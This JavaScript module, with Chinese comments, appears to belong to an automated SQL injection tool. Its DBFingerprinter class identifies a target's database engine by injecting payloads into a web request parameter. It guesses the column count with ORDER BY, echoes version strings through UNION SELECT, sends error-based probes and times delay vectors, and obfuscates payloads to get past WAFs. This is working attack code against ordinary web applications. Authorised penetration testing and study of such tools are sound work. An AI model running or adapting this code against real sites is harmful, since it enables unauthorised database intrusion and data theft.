import { FINGERPRINT, DB_VERSION, nullSequence, dbmsFromError, TIME_VECTORS, PAYLOADS, fillPayload } from './payloads.js';
import { parseDbmsVersion } from './dbmsVersion.js';
import {
  buildInjectionRequest,
  sendInjection,
  obfuscateIfNeeded,
  discoverEchoColumns,
} from './injection.js';
import { binaryGuessColumns } from './columnGuess.js';
import { _colGuessCache, colGuessScopeKey } from './Extractor.js';
import { WRAP, WRAP_NOCAST, HIGH_FREQ_DBMS, fromDummy, resolveFromClause } from './DialectSqlBuilder.js';

// [⑬] DialectSqlBuilder 收敛：WRAP/HIGH_FREQ_DBMS/fromDummy 原定义于此，现已收敛到
// DialectSqlBuilder.js 单一事实源。此处 re-export 保持向后兼容。
export { WRAP, HIGH_FREQ_DBMS, fromDummy };

// 数据库指纹识别器：按响应头特征 + UNION 版本回显判定 dbms
export class DBFingerprinter {
  /**
   * @param {object} ctx { httpClient, target, point, config }
   * @returns {Promise<{dbms: string|null, baseline: {status:number, headers:object, body:string}}>}
   *   dbms: 命中的数据库类型；baseline: 指纹阶段已抓取的良性基线响应（供 WAF 识别复用，零额外发包）
   */
  async fingerprint(ctx) {
    const { httpClient, target, point, config } = ctx;
    const maxCols = config?.maxColumnsGuess ?? 50;
    const obf = (s) => obfuscateIfNeeded(ctx, s);

    const baseReq = buildInjectionRequest(target, point, obf(point.originalValue || '1'));
    const _t0 = Date.now();
    const baseline = await sendInjection(httpClient, ctx, baseReq);
    // 基线 RTT：时间向量定库的阈值补偿基准（高延迟网络防第一个向量即误命中）
    const baselineRtt = Date.now() - _t0;
    // 归一化基线响应（status/headers/body），供 WAF 指纹识别复用，不发起任何新请求
    const baselineResp = {
      status: baseline?.status ?? 0,
      headers: baseline?.headers ?? {},
      body: String(baseline?.data ?? ''),
    };
    const baseLen = baselineResp.body.length;

    // 1) 猜列数（ORDER BY 二分，请求数 ~log2(maxCols)，与 UnionDetector/Extractor 统一）
    const columns = await binaryGuessColumns(
      (n) =>
        sendInjection(
          httpClient,
          ctx,
          buildInjectionRequest(target, point, obf(`${point.originalValue || '1'} ORDER BY ${n}-- -`))
        ),
      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(target, point?.id) }
    );

    // 2) 响应头快速识别（命中即定库，无需 UNION）
    const headers = baseline?.headers || {};
    for (const [dbms, sigs] of Object.entries(FINGERPRINT)) {
      const hit = sigs.some((s) => {
        const hv = headers[s.header.toLowerCase()];
        return hv != null && s.match.test(hv);
      });
      if (hit) return { dbms, baseline: baselineResp };
    }

    // 3) 定位回显列（标记 UNION），无回显则无法走 UNION 指纹
    const echoCols = await discoverEchoColumns(httpClient, ctx, columns);

    // 4) 各库版本函数置于首个回显列，检测标记间版本特征
    // MariaDB 置于遍历首位（优先命中），且复用以 MySQL 的 WRAP（协议互通）
    if (echoCols.length) {
      const order = ['MariaDB', ...Object.keys(DB_VERSION).filter((k) => k !== 'MariaDB')];
      for (const dbms of order) {
        const info = DB_VERSION[dbms];
        // 协议兼容库（MariaDB/TiDB→MySQL，DM8→Oracle）复用对应 WRAP 分支
        const wrapKey = dbms === 'MariaDB' || dbms === 'TiDB' ? 'MySQL' : dbms === 'DM8' ? 'Oracle' : dbms;
        const nulls = nullSequence(columns).split(',');
        const idx = echoCols[0];
        const cols = nulls
          .map((_, i) => (i === idx ? ((ctx.config?.noCast && WRAP_NOCAST[wrapKey]) ? WRAP_NOCAST[wrapKey](info.func) : WRAP[wrapKey](info.func)) : 'NULL'))
          .join(',');
        // UNION SELECT 的伪表：Oracle/DM8→dual，DB2/Firebird/Informix→各自专属伪表，其余省略
        const fromDummySql = resolveFromClause(dbms, ctx?.config?.unionFrom);
        const payload = `${point.originalValue || '1'} UNION SELECT ${cols}${fromDummySql}-- -`;
        const res = await sendInjection(
          httpClient,
          ctx,
          buildInjectionRequest(target, point, obf(payload))
        );
        const body = String(res?.data ?? '');
        // D6: 大小写不敏感匹配（免疫 lowercase/uppercase/mixedcase tamper 破坏标记）
        const m = body.match(/__S__(.*?)__E__/is);
        const ver = m ? m[1] : '';
        if (info.sig.test(ver)) {
          // [P1-FIX 2026-09-05] 一并返回解析后的版本：原实现拿到版本串只用于定库即丢弃，
          // 引擎无法按版本选 payload/枚举 SQL（MSSQL<2017 无 string_agg、MySQL<5.7 用 password 列）
          return { dbms, version: parseDbmsVersion(dbms, ver), baseline: baselineResp };
        }
      }
    }

    // 5) 报错签名定库（P1-D3）：无回显列时，按高频库顺序注入各库报错 payload，
    //    命中响应中的 per-dbms 报错特征即停（不再死回退 MySQL）。
    const errDbms = await this._fingerprintByError(ctx, httpClient, target, point, obf);
    if (errDbms) return { dbms: errDbms, baseline: baselineResp };

    // 6) 时间向量定库（P1-D3）：报错不命中时，注入各库独有延时原语观测耗时定库。
    const timeDbms = await this._fingerprintByTime(ctx, httpClient, target, point, obf, config, baselineRtt);
    if (timeDbms) return { dbms: timeDbms, baseline: baselineResp };

    return { dbms: null, baseline: baselineResp };
  }

  // 报错签名定库：遍历高频库顺序，注入各库 error[0]，对响应跑 dbmsFromError，命中即停。
  async _fingerprintByError(ctx, httpClient, target, point, obf) {
    const orig = point.originalValue || '1';
    for (const dbms of HIGH_FREQ_DBMS) {
      const tpl = (PAYLOADS[dbms] && PAYLOADS[dbms].error && PAYLOADS[dbms].error[0]) || '';
      if (!tpl) continue;
      const payload = obf(fillPayload(tpl, { orig }));
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, payload)
      );
      const hit = dbmsFromError(String(res?.data ?? ''));
      if (hit) return hit;
    }
    return null;
  }

  // 时间向量定库：注入各库独有延时原语，观测耗时超阈值即停（非注入点各向量快速返回，无额外 sleep 成本）。
  // 阈值补偿（历史 bug）：固定 800ms 在高 RTT 网络下第一个向量即误命中（基线就要 900ms）→ 方言判错级联漏报。
  // 有效阈值 = 基线RTT + 配置阈值：延时信号必须显著超出该目标的正常往返，而非绝对墙钟。
  async _fingerprintByTime(ctx, httpClient, target, point, obf, config, baselineRtt = 0) {
    const orig = point.originalValue || '1';
    const sleepSec = config?.fingerprintSleepSec ?? 1;
    const thresholdMs = config?.fingerprintTimeThresholdMs ?? 800;
    const effThreshold = baselineRtt + thresholdMs;
    for (const { dbms, payload } of TIME_VECTORS) {
      const filled = obf(fillPayload(payload, { orig, sleep: sleepSec }));
      const t0 = Date.now();
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, filled)
      );
      if (res && Date.now() - t0 >= effThreshold) return dbms;
    }
    return null;
  }
}

export default DBFingerprinter;
